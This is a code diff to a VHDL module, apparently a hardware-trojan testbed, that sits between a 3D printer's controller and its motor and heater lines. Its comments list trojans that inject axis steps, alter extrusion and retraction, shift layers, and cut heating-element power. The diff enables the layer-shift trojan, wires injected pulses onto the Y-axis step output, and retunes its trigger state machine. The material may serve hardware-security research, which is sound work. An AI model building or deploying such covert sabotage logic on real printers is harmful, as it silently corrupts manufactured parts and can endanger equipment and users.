@@ -106,8 +106,8 @@ architecture Behavioral of Trojan_TOP is
     -- Temporarily we will set the enabled trojans here, hardcoded. Vivado will optimize out the unused ones.
     signal TROJ_T1_ENABLE : std_logic := '0'; -- Adds steps from X or Y axis during move
     signal TROJ_T2_ENABLE : std_logic := '0'; -- Constant over / under extrusion per print
-    signal TROJ_T3_ENABLE : std_logic := '1'; -- Increases or decreases filament retraction between layers
-    signal TROJ_T4_ENABLE : std_logic := '0'; -- Small Shift along X and Y axis on random Z layer increment
+    signal TROJ_T3_ENABLE : std_logic := '0'; -- Increases or decreases filament retraction between layers
+    signal TROJ_T4_ENABLE : std_logic := '1'; -- Small Shift along X and Y axis on random Z layer increment
     signal TROJ_T5_ENABLE : std_logic := '0'; -- Denial of service via disabling D8/D10 heating element power
     signal TROJ_T6_ENABLE : std_logic := '0'; -- Add Z steps after Home to change bed leveling
 
@@ -174,22 +174,39 @@ begin
     -- Modify these signals as needed
     o_LED       <= OUTPUT_LED;
     o_E0_DIR    <= i_E0_DIR ;
-    o_E0_EN     <= i_E0_EN  ; --when TROJ_T3_ENABLE = '0' else '1';
-    --o_E0_STEP   <= i_E0_STEP when TROJ_T2_ENABLE = '0' else TROJ_T2_EXTRUDER_OUT; 
-    --o_E0_STEP   <= i_E0_STEP when TROJ_T3_ENABLE = '0' else TROJ_T3_EXTRUDER_OUT;     
+    o_E0_EN     <= i_E0_EN  ;
     o_E0_STEP   <= i_E0_STEP;       
     o_X_DIR     <= i_X_DIR  ;
     o_X_EN      <= i_X_EN   ;   
     o_X_MIN     <= i_X_MIN  ;
-    o_X_STEP    <= i_X_STEP ;-- when TROJ_T1_ENABLE = '0' else (i_X_STEP or X_STEP_MOD);                 
+    o_X_STEP    <= i_X_STEP ;                
     o_Y_DIR     <= i_Y_DIR  ;
     o_Y_EN      <= i_Y_EN   ;
     o_Y_MIN     <= i_Y_MIN  ;
-    o_Y_STEP    <= i_Y_STEP ;--when TROJ_T1_ENABLE = '0' else (i_Y_STEP or Y_STEP_MOD);                 
+    --o_Y_STEP    <= i_Y_STEP ;               
     o_Z_DIR     <= i_Z_DIR  ;
     o_Z_EN      <= i_Z_EN   ;
     o_Z_MIN     <= i_Z_MIN  ;            
     o_Z_STEP    <= i_Z_STEP ;
+    
+    -- Trojan 1 Related Signals 
+    --o_X_STEP    <= i_X_STEP when TROJ_T1_ENABLE = '0' else (i_X_STEP or X_STEP_MOD);   
+    --o_Y_STEP    <= i_Y_STEP when TROJ_T1_ENABLE = '0' else (i_Y_STEP or Y_STEP_MOD);  
+
+    -- Trojan 2 Related Signals 
+    --o_E0_STEP   <= i_E0_STEP when TROJ_T2_ENABLE = '0' else TROJ_T2_EXTRUDER_OUT;
+    
+    -- Trojan 3 Related Signals 
+    --o_E0_STEP   <= i_E0_STEP when TROJ_T3_ENABLE = '0' else TROJ_T3_EXTRUDER_OUT;   
+        
+    -- -- Trojan 4 Related Signals 
+    o_Y_STEP    <= i_Y_STEP when TROJ_T4_ENABLE = '0' else (i_Y_STEP or Y_STEP_MOD);
+    
+    
+    -- -- Trojan 5 Related Signals 
+
+    
+    
  
     --------------------------- Trojan 1 Logic Start ---------------------------
     -- This trojan adds or removes steps from the X and Y Axis 
@@ -349,7 +366,7 @@ begin
                      end if;
 
                  when STATE_1 => -- Wait for a certain number of z steps
-                     if (TROJ_T4_Z_PULSE_COUNT = X"32") then -- 0x32 == 50 steps
+                     if (TROJ_T4_Z_PULSE_COUNT = X"FF") then -- 255 pulses --> 
                          T4_NEXT_STATE <= STATE_2;
                      else 
                          if(Z_STEP_EDGE = '1') then
@@ -357,16 +374,19 @@ begin
                          end if;
                      end if;
                  when STATE_2 => 
+                     Y_PULSE_EN <= '1';
+                     T4_NEXT_STATE <= STATE_3;
+
+                 when STATE_3 => 
                      if(Y_STEP_COMPLETE = '1') then
                          Y_PULSE_EN <= '0';
                          T4_NEXT_STATE <= IDLE;
-                     else 
-                         Y_PULSE_EN <= '1';
+                     else
+                        T4_NEXT_STATE <= STATE_3;
                      end if;
-
-                 when STATE_3 => T3_NEXT_STATE <= DISABLE; -- Unused
-                 when STATE_4 => T3_NEXT_STATE <= DISABLE; -- Unused
-                 when STATE_5 => T3_NEXT_STATE <= DISABLE; -- Unused
+                     
+                 when STATE_4 => T4_NEXT_STATE <= DISABLE; -- Unused
+                 when STATE_5 => T4_NEXT_STATE <= DISABLE; -- Unused
 
                  when DISABLE => -- Turn off signals here
                      TROJ_T4_Z_PULSE_COUNT <= (others=>'0'); 
